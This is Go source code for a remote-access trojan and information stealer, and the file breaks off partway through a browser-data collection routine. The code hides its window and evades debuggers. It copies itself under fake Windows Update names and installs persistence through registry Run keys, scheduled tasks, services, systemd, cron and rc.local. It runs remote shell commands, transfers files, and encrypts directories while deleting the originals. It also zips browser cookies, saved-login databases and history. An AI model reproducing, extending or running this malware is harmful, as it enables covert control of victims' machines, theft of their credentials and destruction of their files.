package main

import (
	"archive/zip"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"time"
)

var (
	swHide, cfBitmap, srcCopy                                           = 0, 2, 0x00CC0020
	createNoWindow                                                      = uint32(0x08000000)
	currentPassword                                                     = ""
	encryptedFiles                                                      = make(map[string]string)
	encryptionKey                                                       []byte
	stealthNames                                                        = []string{"WindowAPI.exe", "UpdateService.exe", "WindowsStart.exe", "Services.exe"}
	user32Dll, gdi32Dll, kernel32Dll                                    = "user32.dll", "gdi32.dll", "kernel32.dll"
	getConsoleWindow, showWindow, getSystemMetrics, getDC               = "GetConsoleWindow", "ShowWindow", "GetSystemMetrics", "GetDC"
	createCompatibleDC, createCompatibleBitmap, selectObject, bitBlt    = "CreateCompatibleDC", "CreateCompatibleBitmap", "SelectObject", "BitBlt"
	deleteObject, deleteDC, releaseDC, openClipboard                    = "DeleteObject", "DeleteDC", "ReleaseDC", "OpenClipboard"
	emptyClipboard, setClipboardData, closeClipboard, isDebuggerPresent = "EmptyClipboard", "SetClipboardData", "CloseClipboard", "IsDebuggerPresent"
)

func decode(s string) string {
	decoded, _ := base64.StdEncoding.DecodeString(s)
	return string(decoded)
}

type SystemInfo struct {
	Hostname, MACAddress, Username string
}

type Command struct {
	Type, Content string
}

type Response struct {
	Type, Content string
}

func hideConsole() {
	if runtime.GOOS != "windows" {
		return
	}

	kernel32 := syscall.NewLazyDLL(kernel32Dll)
	user32 := syscall.NewLazyDLL(user32Dll)

	proc := kernel32.NewProc(getConsoleWindow)
	hwnd, _, _ := proc.Call()

	if hwnd != 0 {
		showWindowProc := user32.NewProc(showWindow)
		showWindowProc.Call(hwnd, uintptr(swHide)) // SW_HIDE
	}

	proc = kernel32.NewProc("FreeConsole")
	proc.Call()

	proc = kernel32.NewProc("SetPriorityClass")
	proc.Call(uintptr(os.Getpid()), 0x00004000) // BELOW_NORMAL_PRIORITY_CLASS
}

func createStealthCopy() string {
	exePath, err := os.Executable()
	if err != nil {
		return ""
	}
	var stealthPath string
	if runtime.GOOS == "windows" {
		systemDirs := []string{os.Getenv("WINDIR") + "\\System32\\", os.Getenv("WINDIR") + "\\SysWOW64\\", os.Getenv("TEMP") + "\\"}
		for _, dir := range systemDirs {
			for _, name := range stealthNames {
				stealthPath = filepath.Join(dir, name)
				if _, err := os.Stat(stealthPath); os.IsNotExist(err) {
					input, err := os.ReadFile(exePath)
					if err == nil {
						err = os.WriteFile(stealthPath, input, 0755)
						if err == nil {
							return stealthPath
						}
					}
				}
			}
		}
	} else {
		stealthPath = "/tmp/.systemd"
		input, err := os.ReadFile(exePath)
		if err == nil {
			os.WriteFile(stealthPath, input, 0755)
			return stealthPath
		}
	}
	return exePath
}

func addToStartup(stealthPath string) {
	if runtime.GOOS == "windows" {
		cmd := exec.Command("reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "WindowsUpdate", "/t", "REG_SZ", "/d", stealthPath, "/f")
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: createNoWindow}
		cmd.Run()
		startupFolder := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
		os.MkdirAll(startupFolder, 0755)
		startupPath := filepath.Join(startupFolder, "WindowsUpdate.vbs")
		vbsContent := fmt.Sprintf(`Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "%s", 0, False
Set WshShell = Nothing`, stealthPath)
		os.WriteFile(startupPath, []byte(vbsContent), 0644)
	} else {
		cronEntry := fmt.Sprintf("@reboot %s\n", stealthPath)
		cmd := exec.Command("crontab", "-l")
		currentCron, _ := cmd.Output()
		if !strings.Contains(string(currentCron), stealthPath) {
			newCron := string(currentCron) + cronEntry
			cmd = exec.Command("crontab", "-")
			cmd.Stdin = strings.NewReader(newCron)
			cmd.Run()
		}
	}
}

func isStealthMode() bool {
	exePath, _ := os.Executable()
	for _, name := range stealthNames {
		if strings.Contains(exePath, name) {
			return true
		}
	}
	return false
}

func checkDebugger() bool {
	if runtime.GOOS == "windows" {
		kernel32 := syscall.NewLazyDLL(kernel32Dll)
		isDebuggerPresentProc := kernel32.NewProc(isDebuggerPresent)
		ret, _, _ := isDebuggerPresentProc.Call()
		return ret != 0
	}
	return false
}

func enhancedPersistence(stealthPath string) {
	if runtime.GOOS == "windows" {
		addToStartup(stealthPath)
		cmd := exec.Command("schtasks", "/create", "/tn", "WindowsUpdate", "/tr", stealthPath, "/sc", "onlogon", "/ru", "SYSTEM", "/f")
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: createNoWindow}
		cmd.Run()
		cmd = exec.Command("reg", "add", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", "/v", "WindowsUpdate", "/t", "REG_SZ", "/d", stealthPath, "/f")
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: createNoWindow}
		cmd.Run()
		exec.Command("sc", "create", "WindowsUpdate", "binPath=", stealthPath, "start=", "auto").Run()
		exec.Command("sc", "start", "WindowsUpdate").Run()
	} else {
		addToStartup(stealthPath)
		serviceContent := fmt.Sprintf(`[Unit]
Description=Windows Update Service
After=network.target
[Service]
Type=simple
ExecStart=%s
Restart=always
RestartSec=5
User=root
[Install]
WantedBy=multi-user.target`, stealthPath)
		os.WriteFile("/etc/systemd/system/windows-update.service", []byte(serviceContent), 0644)
		exec.Command("systemctl", "enable", "windows-update.service").Run()
		exec.Command("systemctl", "start", "windows-update.service").Run()
		rcScript := fmt.Sprintf("#!/bin/sh\n%s &\n", stealthPath)
		os.WriteFile("/etc/rc.local", []byte(rcScript), 0755)
	}
}

func hideProcess() {}

func setupSignalHandler() {
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		for {
			select {
			case <-c:
			}
		}
	}()
}

func restartSelf() {
	exePath, err := os.Executable()
	if err != nil {
		return
	}
	cmd := exec.Command(exePath)
	if runtime.GOOS == "windows" {
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: createNoWindow}
	}
	cmd.Start()
}

func initStealthModeAsync() {
	if checkDebugger() {
		os.Exit(0)
	}

	// Skip stealth copy creation to prevent multiple windows
	// Just hide the process
	hideProcess()
}

func sendData(conn net.Conn, data interface{}) error {
	jsonData, err := json.Marshal(data)
	if err != nil {
		return err
	}
	_, err = conn.Write(jsonData)
	return err
}

func recvData(conn net.Conn) (string, error) {
	var buffer strings.Builder
	tempBuffer := make([]byte, 4096)
	conn.SetReadDeadline(time.Time{})
	for {
		n, err := conn.Read(tempBuffer)
		if err != nil {
			if err == io.EOF {
				break
			}
			return "", err
		}
		buffer.Write(tempBuffer[:n])
		data := buffer.String()
		if strings.HasSuffix(data, "}") || strings.HasSuffix(data, "\n") {
			var testResp Response
			if json.Unmarshal([]byte(data), &testResp) == nil {
				break
			}
		}
		if buffer.Len() > 1024*1024 {
			break
		}
	}
	return buffer.String(), nil
}

func downloadFile(conn net.Conn, filename string) error {
	file, err := os.Open(filename)
	if err != nil {
		return err
	}
	defer file.Close()
	_, err = io.Copy(conn, file)
	return err
}

func uploadFile(conn net.Conn, filename string) error {
	file, err := os.Create(filename)
	if err != nil {
		return err
	}
	defer file.Close()
	conn.SetReadDeadline(time.Time{})
	sizeBytes := make([]byte, 8)
	_, err = io.ReadFull(conn, sizeBytes)
	if err != nil {
		return fmt.Errorf("failed to read file size: %v", err)
	}
	fileSize := int64(binary.LittleEndian.Uint64(sizeBytes))
	_, err = io.CopyN(file, conn, fileSize)
	if err != nil {
		return fmt.Errorf("failed to read file data: %v", err)
	}
	return nil
}

func getHostname() string {
	hostname, err := os.Hostname()
	if err != nil {
		return "unknown"
	}
	return hostname
}

func getMACAddress() string {
	if runtime.GOOS == "windows" {
		cmd := exec.Command("getmac", "/fo", "csv", "/nh")
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: createNoWindow}
		output, err := cmd.Output()
		if err == nil {
			lines := strings.Split(string(output), "\n")
			for _, line := range lines {
				if strings.Contains(line, ",") {
					parts := strings.Split(line, ",")
					if len(parts) >= 2 {
						mac := strings.Trim(parts[1], "\"")
						if len(mac) == 17 && strings.Count(mac, "-") == 5 {
							return mac
						}
					}
				}
			}
		}
		cmd = exec.Command("ipconfig", "/all")
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: createNoWindow}
		output, err = cmd.Output()
		if err == nil {
			lines := strings.Split(string(output), "\n")
			for _, line := range lines {
				if strings.Contains(strings.ToLower(line), "physical address") {
					parts := strings.Split(line, ":")
					if len(parts) >= 2 {
						mac := strings.TrimSpace(parts[1])
						if len(mac) == 17 && strings.Count(mac, "-") == 5 {
							return mac
						}
					}
				}
			}
		}
	} else {
		cmd := exec.Command("sh", "-c", "ip link show | grep -o -E '([0-9A-Fa-f]{2}:){5}([0-9A-Fa-f]{2})' | head -1")
		output, err := cmd.Output()
		if err == nil {
			mac := strings.TrimSpace(string(output))
			if len(mac) == 17 && strings.Count(mac, ":") == 5 {
				return mac
			}
		}
		cmd = exec.Command("sh", "-c", "ifconfig | grep -o -E '([0-9A-Fa-f]{2}:){5}([0-9A-Fa-f]{2})' | head -1")
		output, err = cmd.Output()
		if err == nil {
			mac := strings.TrimSpace(string(output))
			if len(mac) == 17 && strings.Count(mac, ":") == 5 {
				return mac
			}
		}
	}
	return "00:00:00:00:00:00"
}

func getUsername() string {
	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME")
	}
	if username == "" {
		username = os.Getenv("LOGNAME")
	}
	if username == "" {
		if runtime.GOOS == "windows" {
			cmd := exec.Command("cmd", "/c", "echo %USERNAME%")
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: createNoWindow}
			output, err := cmd.Output()
			if err == nil {
				username = strings.TrimSpace(string(output))
			}
		} else {
			cmd := exec.Command("whoami")
			output, err := cmd.Output()
			if err == nil {
				username = strings.TrimSpace(string(output))
			}
		}
	}
	if username == "" {
		username = "unknown"
	}
	return username
}

func executeCommand(command string) string {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", command)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: createNoWindow}
	} else {
		cmd = exec.Command("nohup", "sh", "-c", command)
	}
	output, err := cmd.CombinedOutput()
	if err != nil {
		outputStr := string(output)
		outputLower := strings.ToLower(outputStr)
		if strings.Contains(outputLower, "not recognized") ||
			strings.Contains(outputLower, "invalid argument") ||
			strings.Contains(outputLower, "not found") ||
			strings.Contains(outputLower, "bad command") ||
			strings.Contains(outputLower, "invalid option") ||
			strings.Contains(outputLower, "usage:") ||
			strings.Contains(outputLower, "type") && strings.Contains(outputLower, "for usage") {
			return "Invalid command or argument"
		}
		return fmt.Sprintf("Command failed: %s", strings.TrimSpace(outputStr))
	}
	return string(output)
}

func takeScreenshot() string {
	if runtime.GOOS != "windows" {
		return "Screenshot only supported on Windows"
	}
	user32 := syscall.NewLazyDLL(user32Dll)
	gdi32 := syscall.NewLazyDLL(gdi32Dll)
	getSystemMetricsProc := user32.NewProc(getSystemMetrics)
	width, _, _ := getSystemMetricsProc.Call(0)
	height, _, _ := getSystemMetricsProc.Call(1)
	getDCProc := user32.NewProc(getDC)
	dc, _, _ := getDCProc.Call(0)
	createCompatibleDCProc := gdi32.NewProc(createCompatibleDC)
	memDC, _, _ := createCompatibleDCProc.Call(dc)
	createCompatibleBitmapProc := gdi32.NewProc(createCompatibleBitmap)
	bitmap, _, _ := createCompatibleBitmapProc.Call(dc, width, height)
	selectObjectProc := gdi32.NewProc(selectObject)
	selectObjectProc.Call(memDC, bitmap)
	bitBltProc := gdi32.NewProc(bitBlt)
	bitBltProc.Call(memDC, 0, 0, width, height, dc, 0, 0, uintptr(srcCopy))
	filename := fmt.Sprintf("screenshot_%d.bmp", time.Now().Unix())
	currentDir, err := os.Getwd()
	if err != nil {
		currentDir = "."
	}
	fullPath := filepath.Join(currentDir, filename)
	openClipboardProc := user32.NewProc(openClipboard)
	emptyClipboardProc := user32.NewProc(emptyClipboard)
	setClipboardDataProc := user32.NewProc(setClipboardData)
	closeClipboardProc := user32.NewProc(closeClipboard)
	openClipboardProc.Call(0)
	emptyClipboardProc.Call()
	setClipboardDataProc.Call(uintptr(cfBitmap), bitmap)
	closeClipboardProc.Call()
	batchContent := fmt.Sprintf(`@echo off
powershell -Command "Add-Type -AssemblyName System.Windows.Forms; $clipboard = [System.Windows.Forms.Clipboard]::GetImage(); if ($clipboard) { $clipboard.Save('%s', [System.Drawing.Imaging.ImageFormat]::Bmp); Write-Host 'Screenshot saved successfully' } else { Write-Host 'Failed to capture screenshot' }"
`, fullPath)
	batchPath := filepath.Join(os.TempDir(), "screenshot.bat")
	err = os.WriteFile(batchPath, []byte(batchContent), 0644)
	if err != nil {
		return fmt.Sprintf("Failed to create screenshot script: %v", err)
	}
	cmd := exec.Command("cmd", "/c", batchPath)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: createNoWindow}
	cmd.Run()
	os.Remove(batchPath)
	deleteObjectProc := gdi32.NewProc(deleteObject)
	deleteDCProc := gdi32.NewProc(deleteDC)
	releaseDCProc := user32.NewProc(releaseDC)
	deleteObjectProc.Call(bitmap)
	deleteDCProc.Call(memDC)
	releaseDCProc.Call(0, dc)
	return fmt.Sprintf("Screenshot saved as: %s", filename)
}

func changeDirectory(path string) string {
	err := os.Chdir(path)
	if err != nil {
		return fmt.Sprintf("Error changing directory: %v", err)
	}
	currentDir, err := os.Getwd()
	if err != nil {
		return fmt.Sprintf("Directory changed, but couldn't get current path: %v", err)
	}
	return fmt.Sprintf("\nCurrent directory changed to: %s", currentDir)
}

func generateEncryptionKey(password string) []byte {
	hash := sha256.Sum256([]byte(password))
	return hash[:]
}

func encryptFile(filepath string, password string) string {
	content, err := os.ReadFile(filepath)
	if err != nil {
		return fmt.Sprintf("Failed to read file: %v", err)
	}
	key := generateEncryptionKey(password)
	block, err := aes.NewCipher(key)
	if err != nil {
		return fmt.Sprintf("Failed to create cipher: %v", err)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return fmt.Sprintf("Failed to create GCM: %v", err)
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return fmt.Sprintf("Failed to create nonce: %v", err)
	}
	ciphertext := gcm.Seal(nonce, nonce, content, nil)
	encryptedPath := filepath + ".encrypted"
	err = os.WriteFile(encryptedPath, ciphertext, 0644)
	if err != nil {
		return fmt.Sprintf("Failed to save encrypted file: %v", err)
	}
	encryptedFiles[filepath] = encryptedPath
	os.Remove(filepath)
	return fmt.Sprintf("File encrypted: %s -> %s", filepath, encryptedPath)
}

func decryptFile(filepath string, password string) string {
	encryptedPath := filepath + ".encrypted"
	if _, err := os.Stat(encryptedPath); os.IsNotExist(err) {
		return "Encrypted file not found"
	}
	ciphertext, err := os.ReadFile(encryptedPath)
	if err != nil {
		return fmt.Sprintf("Failed to read encrypted file: %v", err)
	}
	key := generateEncryptionKey(password)
	block, err := aes.NewCipher(key)
	if err != nil {
		return fmt.Sprintf("Failed to create cipher: %v", err)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return fmt.Sprintf("Failed to create GCM: %v", err)
	}
	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		return "Invalid encrypted file"
	}
	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return fmt.Sprintf("Decryption failed: %v", err)
	}
	err = os.WriteFile(filepath, plaintext, 0644)
	if err != nil {
		return fmt.Sprintf("Failed to save decrypted file: %v", err)
	}
	os.Remove(encryptedPath)
	delete(encryptedFiles, filepath)
	return fmt.Sprintf("File decrypted: %s", filepath)
}

func encryptDirectory(dirPath string, password string) string {
	var results []string
	var totalFiles, encryptedFiles int
	err := filepath.Walk(dirPath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if info.IsDir() || strings.HasPrefix(info.Name(), ".") ||
			strings.HasSuffix(path, ".encrypted") || strings.Contains(path, "System32") ||
			strings.Contains(path, "Windows") {
			return nil
		}
		if strings.HasSuffix(strings.ToLower(path), ".exe") ||
			strings.HasSuffix(strings.ToLower(path), ".dll") ||
			strings.HasSuffix(strings.ToLower(path), ".sys") {
			return nil
		}
		totalFiles++
		result := encryptFile(path, password)
		if strings.Contains(result, "File encrypted") {
			encryptedFiles++
		}
		results = append(results, result)
		return nil
	})
	if err != nil {
		return fmt.Sprintf("Error walking directory: %v", err)
	}
	summary := fmt.Sprintf("Directory encryption complete!\nTotal files: %d\nEncrypted: %d\nFailed: %d",
		totalFiles, encryptedFiles, totalFiles-encryptedFiles)
	return summary + "\n\n" + strings.Join(results, "\n")
}

func decryptDirectory(dirPath string, password string) string {
	var results []string
	var totalFiles, decryptedFiles int
	err := filepath.Walk(dirPath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if !strings.HasSuffix(path, ".encrypted") {
			return nil
		}
		totalFiles++
		originalPath := strings.TrimSuffix(path, ".encrypted")
		result := decryptFile(originalPath, password)
		if strings.Contains(result, "File decrypted") {
			decryptedFiles++
		}
		results = append(results, result)
		return nil
	})
	if err != nil {
		return fmt.Sprintf("Error walking directory: %v", err)
	}
	summary := fmt.Sprintf("Directory decryption complete!\nTotal encrypted files: %d\nDecrypted: %d\nFailed: %d",
		totalFiles, decryptedFiles, totalFiles-decryptedFiles)
	return summary + "\n\n" + strings.Join(results, "\n")
}

func setPassword(newPassword string) string {
	currentPassword = newPassword
	encryptionKey = generateEncryptionKey(newPassword)
	return fmt.Sprintf("Password set successfully: %s", newPassword)
}

func getPassword() string {
	if currentPassword == "" {
		return "No password set"
	}
	return fmt.Sprintf("Current password: %s", currentPassword)
}

func listEncryptedFiles() string {
	if len(encryptedFiles) == 0 {
		return "No encrypted files found"
	}
	var result strings.Builder
	result.WriteString("Encrypted files:\n")
	for original, encrypted := range encryptedFiles {
		result.WriteString(fmt.Sprintf("  %s -> %s\n", original, encrypted))
	}
	return result.String()
}

func getBrowserProfiles() []string {
	var profiles []string

	chromePaths := []string{
		filepath.Join(os.Getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
		filepath.Join(os.Getenv("APPDATA"), "Google", "Chrome", "User Data"),
	}

	for _, chromePath := range chromePaths {
		if _, err := os.Stat(chromePath); err == nil {
			profiles = append(profiles, filepath.Join(chromePath, "Default"))
			profileDirs, _ := filepath.Glob(filepath.Join(chromePath, "Profile *"))
			profiles = append(profiles, profileDirs...)
		}
	}

	firefoxPaths := []string{
		filepath.Join(os.Getenv("APPDATA"), "Mozilla", "Firefox", "Profiles"),
		filepath.Join(os.Getenv("LOCALAPPDATA"), "Mozilla", "Firefox", "Profiles"),
	}

	for _, firefoxPath := range firefoxPaths {
		if _, err := os.Stat(firefoxPath); err == nil {
			firefoxDirs, _ := filepath.Glob(filepath.Join(firefoxPath, "*"))
			for _, dir := range firefoxDirs {
				if info, err := os.Stat(dir); err == nil && info.IsDir() {
					profiles = append(profiles, dir)
				}
			}
		}
	}

	edgePaths := []string{
		filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
		filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Edge", "User Data"),
	}

	for _, edgePath := range edgePaths {
		if _, err := os.Stat(edgePath); err == nil {
			profiles = append(profiles, filepath.Join(edgePath, "Default"))
			edgeDirs, _ := filepath.Glob(filepath.Join(edgePath, "Profile *"))
			profiles = append(profiles, edgeDirs...)
		}
	}

	return profiles
}

func copyFileToZip(zipWriter *zip.Writer, srcPath, destPath string) error {
	srcFile, err := os.Open(srcPath)
	if err != nil {
		return err
	}
	defer srcFile.Close()

	destFile, err := zipWriter.Create(destPath)
	if err != nil {
		return err
	}

	_, err = io.Copy(destFile, srcFile)
	return err
}

func extractBrowserData() string {
	tempDir := filepath.Join(os.TempDir(), fmt.Sprintf("tmp_%d", time.Now().UnixNano()))
	os.MkdirAll(tempDir, 0755)
	defer os.RemoveAll(tempDir)

	zipPath := filepath.Join(os.TempDir(), fmt.Sprintf("~%d.tmp", time.Now().UnixNano()))
	zipFile, err := os.Create(zipPath)
	if err != nil {
		return fmt.Sprintf("Failed to create zip file: %v", err)
	}
	defer zipFile.Close()
	defer os.Remove(zipPath)

	zipWriter := zip.NewWriter(zipFile)
	defer zipWriter.Close()

	profiles := getBrowserProfiles()
	var extractedFiles []string

	for _, profilePath := range profiles {
		if _, err := os.Stat(profilePath); os.IsNotExist(err) {
			continue
		}

		profileName := filepath.Base(profilePath)
		if profileName == "" {
			profileName = "Default"
		}

		cookieFiles := []string{
			"Cookies",
			"Network/Cookies",
			"cookies.sqlite",
			"cookies.sqlite-wal",
			"cookies.sqlite-shm",
		}

		for _, cookieFile := range cookieFiles {
			srcPath := filepath.Join(profilePath, cookieFile)
			if _, err := os.Stat(srcPath); err == nil {
				destPath := fmt.Sprintf("%s/%s", profileName, cookieFile)
				if err := copyFileToZip(zipWriter, srcPath, destPath); err == nil {
					extractedFiles = append(extractedFiles, destPath)
				}
			}
		}

		loginFiles := []string{
			"Login Data",
			"logins.json",
			"key4.db",
			"key3.db",
			"cert9.db",
		}

		for _, loginFile := range loginFiles {
			srcPath := filepath.Join(profilePath, loginFile)
			if _, err := os.Stat(srcPath); err == nil {
				destPath := fmt.Sprintf("%s/%s", profileName, loginFile)
				if err := copyFileToZip(zipWriter, srcPath, destPath); err == nil {
					extractedFiles = append(extractedFiles, destPath)
				}
			}
		}

		historyFiles := []string{
			"History",
			"places.sqlite",
			"Web Data",
		}

		for _, historyFile := range historyFiles {
			srcPath := filepath.Join(profilePath, historyFile)
			if _, err := os.Stat(srcPath); err == nil {
				destPath := fmt.Sprintf("%s/%s", profileName, historyFile)
				if err := copyFileToZip(zipWriter, srcPath, destPath); err == nil {
					extractedFiles = append(extractedFiles, destPath)
				}
			}
		}

		bookmarkFiles := []string{
			"Bookmarks",
			"bookmarks.json",
		}

		for _, bookmarkFile := range bookmarkFiles {
			srcPath := filepath.Join(profilePath, bookmarkFile)
			if _, err := os.Stat(srcPath); err == nil {
				destPath := fmt.Sprintf("%s/%s", profileName, bookmarkFile)
				if err := copyFileToZip(zipWriter, srcPath, destPath); err == nil {
					extractedFiles = append(extractedFiles, destPath)
				}
			}
		}

		autofillFiles := []string{
			"Web Data",
			"formhistory.sqlite",
		}

		for _, autofillFile := range autofillFiles {
			srcPath := filepath.Join(profilePath, autofillFile)
			if _, err := os.Stat(srcPath); err == nil {
				destPath := fmt.Sprintf("%s/autofill_%s", profileName, autofillFile)
				if err := copyFileToZip(zipWriter, srcPath, destPath); err == nil {
					extractedFiles = append(extractedFiles, destPath)
				}
			}
		}
	}

	systemPaths := []string{
		filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Cookies"),
		filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "Windows", "INetCookies"),
	}

	for _, sysPath := range systemPaths {
		if _, err := os.Stat(sysPath); err == nil {
			filepath.Walk(sysPath, func(path string, info os.FileInfo, err error) error {
				if err != nil {
					return nil
				}
				if !info.IsDir() {
					relPath, _ := filepath.Rel(sysPath, path)
					destPath := fmt.Sprintf("System/%s", relPath)
					if err := copyFileToZip(zipWriter, path, destPath); err == nil {
						extractedFiles = append(extractedFiles, destPath)
					}
				}
				return nil
			})
		}
	}

	if len(extractedFiles) == 0 {
		return "No browser data found to extract"
	}

	zipWriter.Close()
	zipFile.Close()

	time.Sleep(100 * time.Millisecond)

	finalPath := filepath.Join(os.TempDir(), fmt.Sprintf("browser_data_%d.zip", time.Now().UnixNano()))
	err = os.Rename(zipPath, finalPath)
	if err != nil {
		srcFile, err2 := os.Open(zipPath)
		if err2 != nil {
			return fmt.Sprintf("Failed to move zip file: %v", err)
		}
		defer srcFile.Close()

		dstFile, err2 := os.Create(finalPath)
		if err2 != nil {
			return fmt.Sprintf("Failed to create final zip file: %v", err2)
		}
		defer dstFile.Close()

		_, err2 = io.Copy(dstFile, srcFile)
		if err2 != nil {
			return fmt.Sprintf("Failed to copy zip file: %v", err2)
		}

		os.Remove(zipPath)
	}

	pathRefFile := filepath.Join(os.TempDir(), fmt.Sprintf("~browser_paths_%d.txt", time.Now().UnixNano()))
	pathContent := fmt.Sprintf("Browser Data Extraction Results\n================================\n\nZIP File Location: %s\n\nExtracted Files (%d):\n%s\n\nExtraction Time: %s\n\nNote: This file will be automatically deleted after 24 hours.",
		finalPath, len(extractedFiles), strings.Join(extractedFiles, "\n"), time.Now().Format("2006-01-02 15:04:05"))
	os.WriteFile(pathRefFile, []byte(pathContent), 0644)

	go func() {
		time.Sleep(24 * time.Hour)
		os.Remove(finalPath)
		os.Remove(pathRefFile)
	}()

	return fmt.Sprintf("Browser data extracted successfully!\n\n📁 ZIP FILE LOCATION:\n%s\n\n📄 PATH REFERENCE FILE:\n%s\n\n📊 EXTRACTION SUMMARY:\nFiles extracted: %d\n\n📋 EXTRACTED FILES:\n%s\n\n💡 TIP: You can access the zip file at the path above to view all browser data",
		finalPath, pathRefFile, len(extractedFiles), strings.Join(extractedFiles, "\n"))
}

func extractBrowserDataStealth() string {
	stealthDir := filepath.Join(os.TempDir(), fmt.Sprintf("~%x", time.Now().UnixNano()))
	os.MkdirAll(stealthDir, 0755)
	defer os.RemoveAll(stealthDir)

	zipPath := filepath.Join(stealthDir, fmt.Sprintf("browser_data_%x.zip", time.Now().UnixNano()))

	zipFile, err := os.Create(zipPath)
	if err != nil {
		return fmt.Sprintf("Failed to create stealth zip: %v", err)
	}
	defer zipFile.Close()
	defer os.Remove(zipPath)

	zipWriter := zip.NewWriter(zipFile)
	defer zipWriter.Close()

	profiles := getBrowserProfiles()
	var extractedFiles []string

	browserData := map[string][]string{
		"cookies":     {"Cookies", "Network/Cookies", "cookies.sqlite", "cookies.sqlite-wal", "cookies.sqlite-shm"},
		"logins":      {"Login Data", "logins.json", "key4.db", "key3.db", "cert9.db", "key.db"},
		"history":     {"History", "places.sqlite", "Web Data", "urls.sqlite"},
		"bookmarks":   {"Bookmarks", "bookmarks.json", "bookmarks.bak"},
		"autofill":    {"Web Data", "formhistory.sqlite", "autofill_profiles.sqlite"},
		"passwords":   {"Login Data", "logins.json", "signons.sqlite"},
		"downloads":   {"History", "downloads.sqlite"},
		"cache":       {"Cache", "cache2", "GPUCache", "ShaderCache"},
		"extensions":  {"Extensions", "Local Extension Settings"},
		"preferences": {"Preferences", "prefs.js", "user.js"},
	}

	for _, profilePath := range profiles {
		if _, err := os.Stat(profilePath); os.IsNotExist(err) {
			continue
		}

		profileName := filepath.Base(profilePath)
		if profileName == "" {
			profileName = "Default"
		}

		// Extract all types of browser data
		for dataType, files := range browserData {
			for _, fileName := range files {
				srcPath := filepath.Join(profilePath, fileName)
				if _, err := os.Stat(srcPath); err == nil {
					destPath := fmt.Sprintf("%s/%s/%s", profileName, dataType, fileName)
					if err := copyFileToZip(zipWriter, srcPath, destPath); err == nil {
						extractedFiles = append(extractedFiles, destPath)
					}
				}
			}
		}

		profileDirs := []string{"Local Storage", "Session Storage", "IndexedDB", "databases"}
		for _, dirName := range profileDirs {
			dirPath := filepath.Join(profilePath, dirName)
			if _, err := os.Stat(dirPath); err == nil {
				filepath.Walk(dirPath, func(path string, info os.FileInfo, err error) error {
					if err != nil {
						return nil
					}
					if !info.IsDir() {
						relPath, _ := filepath.Rel(profilePath, path)
						destPath := fmt.Sprintf("%s/%s", profileName, relPath)
						if err := copyFileToZip(zipWriter, path, destPath); err == nil {
							extractedFiles = append(extractedFiles, destPath)
						}
					}
					return nil
				})
			}
		}
	}

	systemDataPaths := []string{
		filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Cookies"),
		filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "Windows", "INetCookies"),
		filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Recent"),
		filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Themes"),
	}

	for _, sysPath := range systemDataPaths {
		if _, err := os.Stat(sysPath); err == nil {
			filepath.Walk(sysPath, func(path string, info os.FileInfo, err error) error {
				if err != nil {
					return nil
				}
				if !info.IsDir() {
					relPath, _ := filepath.Rel(sysPath, path)
					destPath := fmt.Sprintf("System/%s", relPath)
					if err := copyFileToZip(zipWriter, path, destPath); err == nil {
						extractedFiles = append(extractedFiles, destPath)
					}
				}
				return nil
			})
		}
	}

	if len(extractedFiles) == 0 {
		return "No browser data found for stealth extraction"
	}

	stealthLocations := []string{
		filepath.Join(os.TempDir(), fmt.Sprintf("browser_data_%x.zip", time.Now().UnixNano())),
		filepath.Join(os.Getenv("TEMP"), fmt.Sprintf("browser_data_%x.zip", time.Now().UnixNano())),
		filepath.Join(os.Getenv("LOCALAPPDATA"), "Temp", fmt.Sprintf("browser_data_%x.zip", time.Now().UnixNano())),
	}

	zipWriter.Close()
	zipFile.Close()

	time.Sleep(100 * time.Millisecond)

	var finalPaths []string
	for _, location := range stealthLocations {
		if err := os.Rename(zipPath, location); err == nil {
			finalPaths = append(finalPaths, location)
			go func(path string) {
				time.Sleep(48 * time.Hour)
				os.Remove(path)
			}(location)
			break
		} else {
			srcFile, err2 := os.Open(zipPath)
